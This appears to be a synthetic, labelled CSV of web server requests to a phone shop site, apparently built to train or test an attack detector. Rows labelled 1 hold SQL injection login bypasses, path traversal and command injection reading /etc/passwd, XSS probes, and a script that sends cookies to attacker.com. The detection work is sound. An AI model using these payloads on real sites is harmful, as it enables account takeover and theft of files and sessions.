timestamp,ip,method,path,payload,label
07:54:16.9,10.0.0.67,GET,/category/Iphone,,0
07:54:19.2,203.162.4.190,GET,/order/cart,,0
07:54:21.1,203.162.4.191,GET,/,,0
07:54:22.8,192.168.1.18,GET,/order/myorders,,0
07:54:25.7,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:54:27.4,192.168.1.55,GET,/order/cart,,0
07:54:29.4,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:54:30.8,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:54:33.1,103.75.118.228,GET,/product/1' AND 1=1,,1
07:54:35.7,127.0.0.1,GET,/,,0
07:54:37.7,10.0.0.15,POST,/auth/login,"{'csrf_token': 'Im9bjZVtVQdFyhNGwFYVBTmJx8kZSwYFwNzaijl7JJ'.vKC0MKk8.K2Hw8u1F39DSIGN3h424Y-scD6cx, 'username': 'user59', 'password': 'dHqxK7pe3eHW', 'submit': 'Log in'}",0
07:54:39.6,10.0.0.67,POST,/search,{'query': 'iphone 15 pro max'},0
07:54:40.9,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:54:43.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Im7M6E5g1mleiaFRujXclz6ePYEgp63RHkewFtUOrE'.oQ8OUaM0.XgiajqHF2llfgiV4zHRM2BQCuTe1, 'username': 'user17', 'password': 'RfM(6FwTk5$9', 'submit': 'Log in'}",0
07:54:45.6,192.168.1.50,GET,/product/1,,0
07:54:47.6,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:54:48.9,192.168.1.141,POST,/auth/register,"{'csrf_token': 'ImDExJ8Sub3LZJ4urbI05dsoZ5MeDWykFm3rbQMiCo'.7xWepUKg.gAR6X3fA0FOxLu_GFk8TJn-KpjIo, 'username': 'newuser69', 'email': 'a70@b.com', 'password': 'KOqt*wo*iAxd', 'submit': 'Register'}",0
07:54:51.2,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:54:53.1,103.75.118.228,GET,/../../../../etc/passwd,,1
07:54:55.6,127.0.0.1,GET,/auth/login,,0
07:54:57.0,10.0.0.146,GET,/auth/register,,0
07:54:59.3,103.75.118.228,GET,/../../../../etc/passwd,,1
07:55:00.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:55:02.9,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
07:55:05.6,103.75.118.228,GET,/product/1' AND 1=1,,1
07:55:07.7,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
07:55:09.6,10.0.0.28,GET,/order/cart,,0
07:55:11.7,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImnfByM9NjfUbqZdxVl3fCZhg9796tCClSFxMLxrMP'.zugNdi74.SdtRDVp9svSCb_vpnfTCjnfQadrH, 'username': 'newuser48', 'email': 'a2@b.com', 'password': '13WvaxAVZHxE', 'submit': 'Register'}",0
07:55:13.2,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:55:15.5,192.168.1.18,POST,/auth/register,"{'csrf_token': 'ImLsp4WdpsDnJSkNb2hAi2auvUq7yyhCH3DGrasPUm'.sOs7KkDa.cjXE1gSOTOry0-Rtz3arD1uPLJs3, 'username': 'newuser12', 'email': 'a84@b.com', 'password': '!7LP9eI9PaZf', 'submit': 'Register'}",0
07:55:17.1,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:55:19.7,203.162.4.190,GET,/order/cart,,0
07:55:21.7,10.0.0.28,GET,/auth/register,,0
07:55:23.6,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:55:25.7,192.168.1.175,GET,/product/1,,0
07:55:27.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:55:29.2,192.168.1.18,POST,/auth/login,"{'csrf_token': 'Imny9tkNFpfxT9hXE5lnrvOulxg23Vn8orVfNdCGVn'.YSu4falH.p3PX5NNxJ6swDTVf4Cpm6Ykk7s58, 'username': 'user92', 'password': 'ahaG90uIFjXo', 'submit': 'Log in'}",0
07:55:30.9,10.0.0.82,GET,/auth/login,,0
07:55:33.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:55:35.4,192.168.1.169,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:55:37.7,203.162.4.191,GET,/product/1' AND 1=1,,1
07:55:39.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:55:41.3,10.0.0.28,POST,/auth/login,"{'csrf_token': 'ImAAPnrXFbcJvPvJjbZgbasbxezibNov7E3ITYPGxB'.8YBged8e.Q-dw1OzPshit4YBZRRk0EoJsQLH-, 'username': 'user23', 'password': 'PNxvzCFHGatN', 'submit': 'Log in'}",0
07:55:43.7,192.168.1.46,GET,/order/myorders,,0
07:55:45.0,192.168.1.18,GET,/category/Iphone,,0
07:55:47.4,192.168.1.167,GET,/auth/logout,,0
07:55:49.5,203.162.4.191,GET,/../../../../etc/passwd,,1
07:55:51.5,192.168.1.104,GET,/product/2,,0
07:55:53.4,127.0.0.1,POST,/search,{'query': 'iphone 15 pro max'},0
07:55:55.2,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:55:57.0,192.168.1.165,GET,/product/1,,0
07:55:59.5,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImmDAtlsulaCdkvJErauo00WzvE7vEKnpTgyJ2oKr7'.ayFe9ocq.d5T6QmvvyI6KHggqrit6X3-o9dX1, 'username': 'newuser69', 'email': 'a100@b.com', 'password': 'pScJWW@6R$Ih', 'submit': 'Register'}",0
07:56:01.1,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:56:02.9,192.168.1.22,GET,/order/myorders,,0
07:56:05.4,192.168.1.151,POST,/auth/login,"{'csrf_token': 'ImahxcSlkEH93lKzKlP1X01yIRJoQvkOdciP7nFXYL'.o4eK5E1c.CsD8pGDWWfqLMkDkF0HVR6AtAwWb, 'username': 'user22', 'password': 's9^#D3(n%UKT', 'submit': 'Log in'}",0
07:56:07.0,203.162.4.190,GET,/product/1' AND 1=1,,1
07:56:08.8,203.162.4.191,GET,/product/1' AND 1=1,,1
07:56:10.8,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImWuuCt2nVntuUAqZnbZij3f0IrJm9lq2jggdy25zt'.N93XLGil.Iu0GpBTSk2aU-HMnFC-IWquALpvI, 'username': 'user87', 'password': 'RQ5Bxw^G0yt8', 'submit': 'Log in'}",0
07:56:13.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:56:15.3,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:56:17.3,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:56:19.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:56:21.7,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:56:23.5,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImsyVK6sQjlOF9HiLRqL1f0AejPzQavlVdrvi6KbbU'.oxpM3gre.6WU_0lRABNLvgbXVgSQx0OLoNJmd, 'username': 'user57', 'password': 'rJwj99Np8^LD', 'submit': 'Log in'}",0
07:56:25.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:56:27.7,192.168.1.18,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:56:28.8,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:56:30.8,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:56:33.6,192.168.1.197,GET,/auth/login,,0
07:56:34.9,192.168.1.162,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:56:37.1,10.0.0.106,POST,/auth/register,"{'csrf_token': 'ImC27mmKxdQoFNbOMEGwZhih9QH694dLH4YOffhVu4'.BKjhvdOw.o8mEAgOrUdhY7MJ8qDgkA5gAFee8, 'username': 'newuser2', 'email': 'a78@b.com', 'password': 'Z3OaIf0bxwL3', 'submit': 'Register'}",0
07:56:39.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:56:41.1,203.162.4.190,GET,/../../../../etc/passwd,,1
07:56:43.3,10.0.0.28,GET,/order/cart,,0
07:56:44.9,192.168.1.165,GET,/order/myorders,,0
07:56:47.6,192.168.1.185,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:56:49.2,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImhOufLuYnH4l11Z2kd0Cv2250nS3lnqCpFhV1vJwa'.B2KjAwy3.Q9-G2SrVjRhcH7Ic1I5HueTdcjqL, 'username': 'newuser61', 'email': 'a40@b.com', 'password': '3Ne7Rc1iy$yQ', 'submit': 'Register'}",0
07:56:51.1,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:56:52.9,203.162.4.190,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:56:55.7,192.168.1.165,GET,/product/1,,0
07:56:57.2,192.168.1.162,GET,/auth/login,,0
07:56:59.5,10.0.0.28,GET,/,,0
07:57:01.2,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:57:03.1,10.0.0.146,POST,/auth/register,"{'csrf_token': 'ImQTuuUnpvKIMSKWED8T4eONruWwk3YqU65smWxd0b'.3VW77zwM.ymTPW4UF89yufaPhFSgj06wCoApW, 'username': 'newuser54', 'email': 'a21@b.com', 'password': 'UqLxsCjfqzH(', 'submit': 'Register'}",0
07:57:04.8,192.168.1.185,GET,/auth/register,,0
07:57:07.7,192.168.1.141,GET,/product/1,,0
07:57:09.4,192.168.1.182,GET,/order/cart,,0
07:57:11.5,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:57:12.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:57:15.4,10.0.0.82,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:57:17.3,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:57:19.0,10.0.0.106,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:57:21.2,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImThnciGCu1yV8qXV3L8dl5buEB0KjVQPlQ0SLW7Hf'.qgUTnPAc.w9p2n9aGjU_7JpqpPNcTtM6OzPvI, 'username': 'user13', 'password': ')6u@!Kv2G7Em', 'submit': 'Log in'}",0
07:57:23.3,10.0.0.176,GET,/product/2,,0
07:57:25.5,192.168.1.182,GET,/order/cart,,0
07:57:26.8,10.0.0.15,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:57:29.5,192.168.1.46,GET,/auth/register,,0
07:57:31.2,192.168.1.167,GET,/auth/logout,,0
07:57:33.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:57:34.9,192.168.1.182,GET,/product/2,,0
07:57:37.2,103.75.118.228,GET,/../../../../etc/passwd,,1
07:57:39.5,192.168.1.165,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:57:41.3,203.162.4.191,GET,/../../../../etc/passwd,,1
07:57:43.5,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:57:45.7,192.168.1.169,GET,/,,0
07:57:47.7,10.0.0.79,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:57:49.3,192.168.1.175,GET,/,,0
07:57:50.8,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:57:53.2,103.75.118.228,GET,/../../../../etc/passwd,,1
07:57:55.3,203.162.4.190,GET,/product/1' AND 1=1,,1
07:57:57.7,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:57:58.9,203.162.4.191,GET,/product/1' AND 1=1,,1
07:58:00.9,192.168.1.12,GET,/product/2,,0
07:58:03.3,203.162.4.191,GET,/category/Iphone,,0
07:58:05.6,203.162.4.191,GET,/../../../../etc/passwd,,1
07:58:07.0,10.0.0.176,POST,/auth/register,"{'csrf_token': 'Im7m4RhJWRxEIqVNZW5DUHN0Ix7m2hrLEYHHtl7A3e'.4lmytq00.AdIKcubv7JPHsdqTWwoL5uoBAIKu, 'username': 'newuser23', 'email': 'a27@b.com', 'password': 'I&Q3@yIOmlDy', 'submit': 'Register'}",0
07:58:09.1,10.0.0.82,GET,/,,0
07:58:11.6,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:58:13.4,192.168.1.50,GET,/auth/register,,0
07:58:15.0,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:58:16.9,192.168.1.162,GET,/auth/login,,0
07:58:19.1,192.168.1.167,POST,/auth/register,"{'csrf_token': 'ImyOVSABp9yqT9FbICEKjT5wLB2xdg2zIzSR92GtYt'.vhf2IUM0.9hXJ5zk_NU4AwqAnk_f3072QnYjX, 'username': 'newuser39', 'email': 'a33@b.com', 'password': 'B3bCDAQo1())', 'submit': 'Register'}",0
07:58:20.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:58:23.4,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:58:25.5,192.168.1.104,GET,/auth/logout,,0
07:58:26.8,192.168.1.151,POST,/search,{'query': 'iphone 15 pro max'},0
07:58:28.8,103.75.118.228,GET,/product/1' AND 1=1,,1
07:58:31.3,203.162.4.190,GET,/product/1' AND 1=1,,1
07:58:33.5,192.168.1.12,GET,/auth/logout,,0
07:58:35.4,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:58:37.6,203.162.4.191,GET,/../../../../etc/passwd,,1
07:58:39.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:58:41.4,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:58:43.7,192.168.1.165,GET,/auth/logout,,0
07:58:44.9,192.168.1.18,GET,/product/2,,0
07:58:47.1,192.168.1.162,GET,/auth/login,,0
07:58:48.8,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:58:51.6,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
07:58:53.5,10.0.0.176,POST,/auth/register,"{'csrf_token': 'ImsOChrnfBtFWCTly7jancP9F1ONdW4DYTNjF6TpQS'.4NJyWFde.-9kHlY1vY1ALQhsZHuvc7r7EoJ2c, 'username': 'newuser65', 'email': 'a5@b.com', 'password': 'TN(ELipu^ipW', 'submit': 'Register'}",0
07:58:55.5,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:58:57.5,10.0.0.28,GET,/order/myorders,,0
07:58:59.6,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:59:01.3,192.168.1.165,GET,/order/cart,,0
07:59:03.3,192.168.1.167,GET,/product/2,,0
07:59:05.0,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:59:06.8,192.168.1.165,POST,/auth/register,"{'csrf_token': 'ImQPWxS7223XdWicYoB3COC2XyjS2VfXVNP9APQ6aM'.0PJvjlRQ.jazNAn8PB2zNsbimzprqEUrhEvj-, 'username': 'newuser51', 'email': 'a47@b.com', 'password': 'FwWQG^$8sjYe', 'submit': 'Register'}",0
07:59:09.6,192.168.1.50,GET,/order/cart,,0
07:59:11.5,192.168.1.50,GET,/category/Iphone,,0
07:59:12.8,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:59:14.8,203.162.4.190,GET,/product/1' AND 1=1,,1
07:59:17.6,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:59:19.7,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:59:21.3,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:59:23.7,192.168.1.144,GET,/product/2,,0
07:59:25.7,10.0.0.176,POST,/auth/login,"{'csrf_token': 'ImW64cdw59BHb9VYxmiDoGwiV2NqQweMHAeclTA5Sl'.uijx0OBB.-iQ7DIAp3Gf3wFPWQ1YTkbfVPHp4, 'username': 'user52', 'password': 'z!deQRS9c*Ra', 'submit': 'Log in'}",0
07:59:27.3,192.168.1.104,GET,/order/cart,,0
07:59:29.7,192.168.1.55,GET,/order/myorders,,0
07:59:31.7,192.168.1.151,POST,/auth/register,"{'csrf_token': 'Imb8m5ePTV8uqC1KZUidifnUxHFivQsulIMXgrKVsW'.Lruom4ND.HuSDAm5FDH5WtK24Wfptri8__WPJ, 'username': 'newuser26', 'email': 'a11@b.com', 'password': '^XLAQmVHcJoX', 'submit': 'Register'}",0
07:59:33.3,10.0.0.15,GET,/order/myorders,,0
07:59:35.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:59:37.4,192.168.1.167,GET,/order/cart,,0
07:59:39.3,192.168.1.28,GET,/,,0
07:59:41.1,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:59:43.3,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImtDnzlr3F6CSLeHaeEfRwleCFrGFsOTW5nCnFwmd2'.MY0tJSvq.lErJWwogkgevk8SmE317MhZvwZZx, 'username': 'user21', 'password': 'BfvqQZGtrHNy', 'submit': 'Log in'}",0
07:59:45.3,192.168.1.162,GET,/auth/login,,0
07:59:47.7,192.168.1.56,GET,/,,0
07:59:49.2,192.168.1.55,GET,/order/cart,,0
07:59:51.4,10.0.0.146,GET,/category/Iphone,,0
07:59:53.5,10.0.0.146,GET,/category/Iphone,,0
07:59:54.8,203.162.4.190,GET,/product/1,,0
07:59:57.6,192.168.1.182,GET,/category/Iphone,,0
07:59:59.0,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
08:00:01.3,192.168.1.162,POST,/auth/login,"{'csrf_token': 'Im2HMzXWrl9flcT0OjVXh76CUJUZ54nv3p9XL0zzV2'.LuyKBci0.sOi95VKQBI6B-F-LeHMKz8wPyynV, 'username': 'user36', 'password': '6@n2sOTBpBNe', 'submit': 'Log in'}",0
08:00:02.9,10.0.0.15,GET,/order/myorders,,0
08:00:05.6,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
08:00:07.5,10.0.0.106,GET,/order/cart,,0
08:00:09.2,192.168.1.162,GET,/auth/register,,0
08:00:10.8,192.168.1.197,GET,/auth/logout,,0
08:00:12.8,203.162.4.191,GET,/order/myorders,,0
08:00:14.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:00:17.4,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:00:18.9,192.168.1.18,GET,/,,0
08:00:21.5,192.168.1.22,GET,/order/myorders,,0
08:00:23.2,203.162.4.191,GET,/../../../../etc/passwd,,1
08:00:24.8,192.168.1.185,GET,/product/2,,0
08:00:27.2,192.168.1.141,GET,/order/myorders,,0
08:00:29.2,203.162.4.190,GET,/product/1' AND 1=1,,1
08:00:31.1,10.0.0.67,GET,/,,0
08:00:33.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
08:00:35.5,10.0.0.28,GET,/auth/register,,0
08:00:37.0,192.168.1.169,GET,/auth/logout,,0
08:00:38.9,192.168.1.50,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:00:40.9,192.168.1.165,POST,/search,{'query': 'iphone 15 pro max'},0
08:00:43.4,192.168.1.144,GET,/product/2,,0
08:00:44.8,192.168.1.169,POST,/auth/register,"{'csrf_token': 'Imh0TyskIMw7Iue44AtGwgO0kzdsqIhbNuucfucK2n'.zgyoRjuo.k6cnJ5klqutEflb2JGc-3HCheVzN, 'username': 'newuser25', 'email': 'a84@b.com', 'password': 'P#1AL*D9KtLh', 'submit': 'Register'}",0
08:00:47.3,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
08:00:49.4,192.168.1.22,GET,/auth/login,,0
08:00:51.5,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:00:52.8,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:00:55.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
08:00:57.4,192.168.1.50,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:00:59.6,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
08:01:01.2,10.0.0.146,GET,/product/1,,0
08:01:03.2,127.0.0.1,GET,/auth/register,,0
08:01:05.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
08:01:07.2,203.162.4.190,GET,/../../../../etc/passwd,,1
08:01:09.5,192.168.1.46,GET,/product/2,,0
08:01:11.3,203.162.4.191,GET,/../../../../etc/passwd,,1
08:01:13.5,10.0.0.28,GET,/product/2,,0
08:01:14.9,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImDQTzM7U2L6BQfWTt4nywAb7HGlBVgPsAH1MZ9o7O'.RCmVTS8K.JarFYJ97k9zwxFsqOBYowacy2Nmi, 'username': 'user74', 'password': 'tVNqDhKSJrQ6', 'submit': 'Log in'}",0
08:01:17.5,203.162.4.190,GET,/category/Iphone,,0
08:01:19.0,192.168.1.104,GET,/,,0
08:01:21.6,192.168.1.28,GET,/,,0
08:01:23.0,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
